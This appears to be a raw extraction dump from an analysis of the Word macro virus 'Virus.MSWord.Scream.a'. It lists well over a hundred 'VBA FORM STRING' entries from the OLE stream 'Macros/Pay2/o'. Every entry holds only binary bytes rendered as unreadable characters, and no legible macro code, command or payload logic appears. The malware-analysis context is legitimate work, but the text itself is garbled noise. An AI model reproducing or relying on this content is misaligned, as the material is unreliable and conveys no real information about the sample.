VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}π��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��lz�����y�.�*f�4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k=��wGZ��
���e���j��*(�!Ӻ��. ��5�=�ܖ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0A_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[#8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"��+h_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F潇b½
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G"�����Ҽ^sO-?���� e�8(ꌑ�d|N���h��Z�j��s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#�̒a�eu���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{���a�֏=��xqW�c>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��cK��[/
p~!����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��$��ƞ��부
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���N�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���i���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�����A�E�a�8�dQ�Ȣg��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�Y��c��y3�=�9G�'�#\��/
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ƌ�8�#ơ���+y0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���p8�Z5s���y��X�)����y�X�dgPM�V�\�D���)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�������X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;
���,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�?&�]G�8+�j`&������#���T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G+X�;�pU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4y�n>�#��Wy�D_��'7q�)?���Ixi���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��1٣y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�)cc�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��F~��h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��$;��	}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\OE�b�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�=֟-����]j�=L�11��lj��}p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pt�.{�y��<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��1�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Km�IK,t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e����+i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;;�.?EMW�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f��� �X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�f|����K�꘾��p��տ��?@`���]8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lĸ��u�n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
苝r�}�,�@��b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Z��R�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)���[)�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s����4���]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)glF�h�!�ƹ����f�hO�����շ426A�����f�/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ͱ�����~Z�5	G���}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��wQf���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ê䤮����'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�UF шWJ��g��t��:��*�t��R�<�i)4�"*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���:*e�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ͻ�f��|b��%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���L�(T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gu�\#�$w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�ݷ���[F�n����%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?(⸉�)��l����Ѕ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ً�G-n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L\e�h�s���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�k��\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���fv۪ϓ�KY3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8gy�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q���i����i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X{2�6���6d�Oq�+�fbdǡ���71�Z�]ʮ9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KZ���1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�K/��:�LM�U�:7����M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z���fi:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+6�F�(��r��M���v-7�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r2���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��秠
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4��Y�$j���q�V���o���Zm��e�K�'+O�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�/�N+�*gƟ%[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}V:�M͢{��r�+P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ڒ�r�tv��1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gj�ِbR�Xњ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-s��q#�sȥ-��#�W�ս�5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��bFQ�F/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99w:�$�&��7�e}%=lRPU\AP2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�=��Pp�OoN���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<ƫ�M�_���!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���d�sr�>�^�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�%c]����u�}��È�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�rU���[a�k"{���׍w�����7<V���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#��cO1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�o�s�sZr��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-���8��L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TԖ�zg�8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
򲄡=h�UUU.p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_A�e��H�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]r��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��kYm���N+kG#o�y*��'���X�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Xqq˘:��-��1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l.�w��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3R�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�߮�9�c����"�G0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#ui==UJX�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�F�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ق�*�g��-=0w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ÿ��<�^B"*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,�l�*coW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�vJ�ͯ�Q/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��yh�/�5{�q��0��6����{8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x}���us��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{:r����?p��<k���_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�/�����qr��0붿�g[����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�>k8ĩoc5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ī`}È���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.7������\e\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c�
�����p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��䵹�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&��p��998Ex+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����9����Q���֑Õ_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qT��VF�H٤���f8�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s̀������r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~wi��ۊ�����8_ZcU��]����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�چ��ڭC�9��Ce��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=�;��ư��:	��l�9]k�w#�
-------------------------------------------------------------------------------
